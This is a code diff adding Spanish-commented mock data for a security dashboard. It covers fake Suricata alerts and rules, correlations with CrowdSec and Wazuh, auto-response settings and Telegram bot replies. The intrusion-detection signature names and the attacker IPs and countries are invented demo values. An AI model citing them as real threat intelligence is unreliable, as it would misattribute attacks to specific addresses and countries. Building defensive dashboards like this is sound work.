+            "top_protocols": [
+                {"proto": "TCP", "count": 3500, "bytes": 9_000_000_000},
+                {"proto": "UDP", "count": 1200, "bytes": 500_000_000},
+                {"proto": "ICMP", "count": 121, "bytes": 12_000_000},
+            ],
+            "top_app_protos": [
+                {"app_proto": "tls", "count": 1800, "bytes": 7_200_000_000},
+                {"app_proto": "http", "count": 850, "bytes": 1_200_000_000},
+                {"app_proto": "ssh", "count": 340, "bytes": 180_000_000},
+                {"app_proto": "dns", "count": 1200, "bytes": 80_000_000},
+                {"app_proto": "smb", "count": 45, "bytes": 320_000_000},
+            ],
+            "top_src_ips": [
+                {"ip": "192.168.88.10", "flows": 980, "bytes": 2_300_000_000},
+                {"ip": "192.168.88.11", "flows": 845, "bytes": 1_900_000_000},
+                {"ip": "198.51.100.22", "flows": 312, "bytes": 45_000_000, "has_alerts": True},
+                {"ip": "203.0.113.45", "flows": 89, "bytes": 12_000_000, "has_alerts": True},
+            ],
+            "top_dst_ports": [
+                {"port": 443, "count": 1800},
+                {"port": 80, "count": 850},
+                {"port": 22, "count": 340},
+                {"port": 53, "count": 1200},
+                {"port": 445, "count": 45},
+            ],
+        }
+
+    @staticmethod
+    def dns_queries(limit: int = 50, suspicious_only: bool = False) -> list[dict]:
+        """Consultas DNS capturadas."""
+        result = list(_SURICATA_DNS_QUERIES)
+        if suspicious_only:
+            result = [q for q in result if q["is_suspicious"]]
+        return result[:limit]
+
+    @staticmethod
+    def http_transactions(limit: int = 50, suspicious_only: bool = False) -> list[dict]:
+        """Transacciones HTTP capturadas."""
+        result = list(_SURICATA_HTTP_TRANSACTIONS)
+        if suspicious_only:
+            result = [h for h in result if h["is_suspicious"]]
+        return result[:limit]
+
+    @staticmethod
+    def tls_handshakes(limit: int = 50, suspicious_only: bool = False) -> list[dict]:
+        """Handshakes TLS capturados."""
+        result = list(_SURICATA_TLS_HANDSHAKES)
+        if suspicious_only:
+            result = [t for t in result if t["is_suspicious"]]
+        return result[:limit]
+
+    @staticmethod
+    def rules(
+        limit: int = 100,
+        enabled: bool | None = None,
+        ruleset: str | None = None,
+        category: str | None = None,
+        offset: int = 0,
+    ) -> list[dict]:
+        """Reglas/firmas de Suricata."""
+        result = list(_SURICATA_RULES)
+        if enabled is not None:
+            result = [r for r in result if r["enabled"] == enabled]
+        if ruleset:
+            result = [r for r in result if r["ruleset"] == ruleset]
+        if category:
+            result = [r for r in result if category.lower() in r["category"].lower()]
+        return result[offset: offset + limit]
+
+    @staticmethod
+    def rule_detail(sid: int) -> dict | None:
+        """Detalle de una regla por SID."""
+        return next((r for r in _SURICATA_RULES if r["sid"] == sid), None)
+
+    @staticmethod
+    def rulesets() -> list[dict]:
+        """Rulesets disponibles."""
+        return list(_SURICATA_RULESETS)
+
+    @staticmethod
+    def correlation_crowdsec() -> list[dict]:
+        """IPs con alertas en Suricata que tienen decisión activa en CrowdSec."""
+        return [
+            {
+                "ip": "203.0.113.45",
+                "suricata_alerts": 2,
+                "suricata_signatures": ["ET POLICY SSH session in progress on Expected Port"],
+                "crowdsec_decision_id": "cs-1",
+                "crowdsec_scenario": "crowdsecurity/ssh-bf",
+                "crowdsec_type": "ban",
+                "correlation_type": "confirmed_threat",
+                "geo": {"country": "CN", "country_name": "China", "as_name": "AS4134 Chinanet"},
+            },
+            {
+                "ip": "198.51.100.22",
+                "suricata_alerts": 3,
+                "suricata_signatures": ["ET SCAN Potential SSH Scan", "ET SCAN NMAP -sA packet Scan", "GPL SNMP public access udp"],
+                "crowdsec_decision_id": "cs-2",
+                "crowdsec_scenario": "crowdsecurity/port-scan",
+                "crowdsec_type": "ban",
+                "correlation_type": "confirmed_threat",
+                "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
+            },
+            {
+                "ip": "45.142.212.100",
+                "suricata_alerts": 1,
+                "suricata_signatures": ["ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound"],
+                "crowdsec_decision_id": "cs-4",
+                "crowdsec_scenario": "crowdsecurity/wordpress-bf",
+                "crowdsec_type": "ban",
+                "correlation_type": "correlated",
+                "geo": {"country": "NL", "country_name": "Netherlands", "as_name": "AS206728 Media Land LLC"},
+            },
+            {
+                "ip": "172.16.200.5",
+                "suricata_alerts": 1,
+                "suricata_signatures": ["ET MALWARE Possible Lateral Movement - SMB to Multiple Internal Hosts"],
+                "crowdsec_decision_id": None,
+                "crowdsec_scenario": None,
+                "crowdsec_type": None,
+                "correlation_type": "suricata_only",
+                "geo": None,
+            },
+        ]
+
+    @staticmethod
+    def correlation_wazuh() -> list[dict]:
+        """Correlación temporal entre alertas Suricata y alertas Wazuh."""
+        return [
+            {
+                "suricata_alert_id": "sur-0001",
+                "suricata_signature": "ET SCAN Potential SSH Scan",
+                "suricata_timestamp": _ts(3),
+                "wazuh_alert_id": "mock-00006",
+                "wazuh_description": "Port scan detected",
+                "wazuh_timestamp": _ts(4),
+                "wazuh_agent": "wazuh-server",
+                "delta_seconds": 65,
+                "correlation_strength": "high",
+            },
+            {
+                "suricata_alert_id": "sur-0002",
+                "suricata_signature": "ET POLICY SSH session in progress on Expected Port",
+                "suricata_timestamp": _ts(7),
+                "wazuh_alert_id": "mock-00000",
+                "wazuh_description": "Authentication failure",
+                "wazuh_timestamp": _ts(8),
+                "wazuh_agent": "lubuntu_desk_1",
+                "delta_seconds": 45,
+                "correlation_strength": "high",
+            },
+        ]
+
+    @staticmethod
+    def autoresponse_config() -> dict:
+        """Configuración del circuito de respuesta automática."""
+        return {
+            "enabled": False,
+            "auto_trigger": False,  # Si True: trigger automático sin confirmación humana
+            "suricata_threshold": 3,   # Mínimo de alertas Suricata para sugerir trigger
+            "wazuh_level_required": 10,  # Nivel Wazuh correlacionado requerido
+            "actions": {
+                "crowdsec_ban": True,    # Agregar ban en CrowdSec
+                "mikrotik_block": True,  # Bloquear en Blacklist_Automatica MikroTik
+                "default_duration": "24h",
+            },
+            "last_updated": _ts(60),
+            "updated_by": "admin",
+        }
+
+    @staticmethod
+    def autoresponse_history(limit: int = 10) -> list[dict]:
+        """Historial de triggers del circuito de respuesta."""
+        return [
+            {
+                "id": "ar-001",
+                "ip": "198.51.100.22",
+                "triggered_at": _ts(35),
+                "triggered_by": "admin",
+                "suricata_alerts_count": 4,
+                "wazuh_level": 12,
+                "actions_taken": ["crowdsec_ban", "mikrotik_block"],
+                "crowdsec_decision_id": "cs-2",
+                "mikrotik_rule_id": "*2",
+                "duration": "24h",
+                "reason": "Suricata: port-scan confirmed by Wazuh alert L12",
+                "mock": True,
+            },
+        ][:limit]
+
+    @staticmethod
+    def engine_stats_series(minutes: int = 30) -> list[dict]:
+        """Serie temporal para el gráfico de rendimiento del motor (últimos N minutos)."""
+        _r = _random_module.Random(99999)
+        result = []
+        for i in range(minutes):
+            t = _NOW - timedelta(minutes=minutes - i)
+            pps = _r.randint(800, 1200)
+            alerts_pm = _r.randint(0, 3)
+            if i in (10, 20):
+                alerts_pm += _r.randint(5, 12)
+                pps += _r.randint(200, 500)
+            result.append({
+                "minute": t.strftime("%Y-%m-%dT%H:%M:00"),
+                "packets_per_sec": pps,
+                "alerts_per_min": alerts_pm,
+                "dropped": _r.randint(0, 5),
+            })
+        return result
+
+    @staticmethod
+    def ip_context(ip: str) -> dict:
+        """Contexto Suricata para una IP: alertas + flujos."""
+        alerts = [a for a in _SURICATA_ALERTS if a["src_ip"] == ip or a["dst_ip"] == ip]
+        flows = [f for f in _SURICATA_FLOWS if f["src_ip"] == ip or f["dst_ip"] == ip]
+        return {
+            "ip": ip,
+            "alerts_count": len(alerts),
+            "recent_alerts": alerts[:5],
+            "flows_count": len(flows),
+            "top_signatures": [a["signature"] for a in alerts[:3]],
+            "last_seen": alerts[0]["timestamp"] if alerts else None,
+        }
+
+
+# Attach as class-level attribute so usage is MockData.suricata.xxx()
+MockData.suricata = _SuricataMockData
+
+
+# ── Telegram Mock Data ────────────────────────────────────────────────────────
+
+class _TelegramMockData:
+    """Mock data for Telegram bot integration."""
+
+    @staticmethod
+    def bot_status() -> dict:
+        return {
+            "connected": True,
+            "bot_username": "@netshield_demo_bot",
+            "chat_id": "-1001234567890",
+            "pending_messages": 0,
+            "last_message_at": _ts(5),
+            "mock": True,
+        }
+
+    @staticmethod
+    def report_configs() -> list[dict]:
+        return [
+            {
+                "id": 1,
+                "name": "Alerta Crítica Inmediata",
+                "enabled": True,
+                "trigger": "on_alert",
+                "schedule": None,
+                "sources": ["wazuh", "crowdsec", "suricata"],
+                "min_severity": 12,
+                "audience": "technical",
+                "include_summary": True,
+                "include_charts": False,
+                "chat_id": None,
+                "last_triggered": _ts(15),
+                "created_at": _ts(1440),
+                "updated_at": _ts(60),
+            },
+            {
+                "id": 2,
+                "name": "Resumen Diario",
+                "enabled": True,
+                "trigger": "scheduled",
+                "schedule": "0 8 * * *",
+                "sources": ["wazuh", "mikrotik", "crowdsec", "suricata"],
+                "min_severity": 5,
+                "audience": "executive",
+                "include_summary": True,
+                "include_charts": True,
+                "chat_id": None,
+                "last_triggered": _ts(480),
+                "created_at": _ts(10080),
+                "updated_at": _ts(4320),
+            },
+            {
+                "id": 3,
+                "name": "Reporte Semanal Técnico",
+                "enabled": False,
+                "trigger": "scheduled",
+                "schedule": "0 9 * * 1",
+                "sources": ["wazuh", "mikrotik"],
+                "min_severity": 3,
+                "audience": "compliance",
+                "include_summary": True,
+                "include_charts": True,
+                "chat_id": None,
+                "last_triggered": _ts(10080),
+                "created_at": _ts(43200),
+                "updated_at": _ts(10080),
+            },
+        ]
+
+    @staticmethod
+    def message_logs(limit: int = 20) -> list[dict]:
+        logs = [
+            {
+                "id": 1,
+                "direction": "outbound",
+                "chat_id": "-1001234567890",
+                "message_type": "alert",
+                "content_summary": "🚨 Alerta Crítica: Brute-force SSH detectado desde 203.0.113.45",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(5),
+            },
+            {
+                "id": 2,
+                "direction": "outbound",
+                "chat_id": "-1001234567890",
+                "message_type": "summary",
+                "content_summary": "📊 Resumen diario: 45 alertas, 3 IPs bloqueadas, 12 agentes activos",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(480),
+            },
+            {
+                "id": 3,
+                "direction": "inbound",
+                "chat_id": "123456789",
+                "message_type": "bot_query",
+                "content_summary": "¿Cuántas alertas críticas hay hoy?",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(30),
+            },
+            {
+                "id": 4,
+                "direction": "outbound",
+                "chat_id": "123456789",
+                "message_type": "bot_response",
+                "content_summary": "📋 Hay 3 alertas críticas (nivel ≥12) en las últimas 24h...",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(29),
+            },
+            {
+                "id": 5,
+                "direction": "outbound",
+                "chat_id": "-1001234567890",
+                "message_type": "alert",
+                "content_summary": "⚠️ Port-scan detectado: 198.51.100.22 → 5 puertos escaneados",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(120),
+            },
+            {
+                "id": 6,
+                "direction": "outbound",
+                "chat_id": "-1001234567890",
+                "message_type": "test",
+                "content_summary": "✅ Mensaje de prueba desde NetShield Dashboard",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(1440),
+            },
+            {
+                "id": 7,
+                "direction": "inbound",
+                "chat_id": "123456789",
+                "message_type": "bot_query",
+                "content_summary": "Estado del sistema",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(60),
+            },
+            {
+                "id": 8,
+                "direction": "outbound",
+                "chat_id": "123456789",
+                "message_type": "bot_response",
+                "content_summary": "🖥️ Estado: MikroTik ✅ | Wazuh ✅ | CrowdSec ✅ | Suricata ✅",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(59),
+            },
+            {
+                "id": 9,
+                "direction": "outbound",
+                "chat_id": "-1001234567890",
+                "message_type": "alert",
+                "content_summary": "🔴 CrowdSec: IP 185.220.101.50 baneada (Tor exit node, ssh-bf)",
+                "status": "failed",
+                "error": "Telegram API timeout after 3 retries",
+                "created_at": _ts(240),
+            },
+            {
+                "id": 10,
+                "direction": "outbound",
+                "chat_id": "-1001234567890",
+                "message_type": "report",
+                "content_summary": "📄 Reporte semanal técnico generado (12 páginas, 3 gráficos)",
+                "status": "sent",
+                "error": None,
+                "created_at": _ts(10080),
+            },
+        ]
+        return logs[:limit]
+
+    @staticmethod
+    def send_message(text: str) -> dict:
+        return {
+            "ok": True,
+            "message_id": 12345,
+            "chat_id": "-1001234567890",
+            "text_preview": text[:100],
+            "mock": True,
+        }
+
+    @staticmethod
+    def bot_query_response(query: str) -> str:
+        """Return a mock AI-generated response based on keyword matching."""
+        q = query.lower()
+        if any(w in q for w in ["alerta", "alert", "crítica", "critical"]):
+            return (
+                "📋 <b>Alertas en las últimas 24h:</b>\n\n"
+                "• <b>3</b> alertas críticas (nivel ≥12)\n"
+                "• <b>12</b> alertas altas (nivel 8-11)\n"
+                "• <b>45</b> alertas totales\n\n"
+                "🔴 Más crítica: <i>Brute-force SSH desde 203.0.113.45</i> (nivel 14)\n"
+                "📍 Agente: lubuntu_desk_1\n\n"
+                "💡 Recomendación: La IP ya fue bloqueada en MikroTik y CrowdSec."
+            )
+        if any(w in q for w in ["estado", "status", "sistema", "health"]):
+            return (
+                "🖥️ <b>Estado del Sistema NetShield:</b>\n\n"
+                "• MikroTik: ✅ Online (CPU 23%, RAM 45%)\n"
+                "• Wazuh: ✅ 12 agentes activos\n"
+                "• CrowdSec: ✅ 5 decisiones activas\n"
+                "• Suricata: ✅ IDS mode, 1.2K pps\n\n"
+                "⏱️ Uptime MikroTik: 45d 12h 30m\n"
+                "📊 Sin incidentes críticos en las últimas 2h."
+            )
+        if any(w in q for w in ["atacante", "attacker", "ip", "bloqueo", "block"]):
+            return (
+                "🛡️ <b>Top IPs Atacantes (últimas 24h):</b>\n\n"
+                "1. <code>203.0.113.45</code> — 🇨🇳 CN — SSH brute-force (bloqueada ✅)\n"
+                "2. <code>198.51.100.22</code> — 🇷🇺 RU — Port scan (bloqueada ✅)\n"
+                "3. <code>185.220.101.50</code> — 🇩🇪 DE — HTTP probing, Tor exit (bloqueada ✅)\n\n"
+                "📊 Total: 5 IPs bloqueadas en MikroTik + CrowdSec.\n"
+                "💡 Todas las IPs tienen score CrowdSec > 75."
+            )
+        if any(w in q for w in ["mikrotik", "router", "firewall", "tráfico"]):
+            return (
+                "🔧 <b>Estado MikroTik:</b>\n\n"
+                "• CPU: 23% | RAM: 128/256 MB (50%)\n"
+                "• Interfaces activas: 4/6\n"
+                "• Conexiones activas: 847\n"
+                "• Reglas firewall: 12 (3 de Blacklist_Automatica)\n"
+                "• Tráfico: ↓ 45 Mbps / ↑ 12 Mbps\n\n"
+                "⏱️ Uptime: 45 días, 12 horas"
+            )
+        if any(w in q for w in ["crowdsec", "decisión", "ban"]):
+            return (
+                "🛡️ <b>CrowdSec — Resumen:</b>\n\n"
+                "• Decisiones activas: 5 (4 ban, 1 captcha)\n"
+                "• Alertas 24h: 23\n"
+                "• Escenarios activos: ssh-bf, port-scan, http-probing\n"
+                "• Bouncers: 1 conectado\n\n"
+                "📊 Top país atacante: 🇨🇳 China (35% de alertas)"
+            )
+        # Default response
+        return (
+            "ℹ️ <b>NetShield Bot</b>\n\n"
+            "Puedo ayudarte con información sobre:\n"
+            "• <code>/alertas</code> — Alertas y eventos de seguridad\n"
+            "• <code>/estado</code> — Estado de todos los servicios\n"
+            "• <code>/atacantes</code> — IPs atacantes y bloqueos\n"
+            "• <code>/mikrotik</code> — Estado del router\n"
+            "• <code>/crowdsec</code> — Decisiones y escenarios\n\n"
+            "💡 También puedes preguntar en lenguaje natural."
+        )
+
+
+# Attach as class-level attribute so usage is MockData.telegram.xxx()
+MockData.telegram = _TelegramMockData
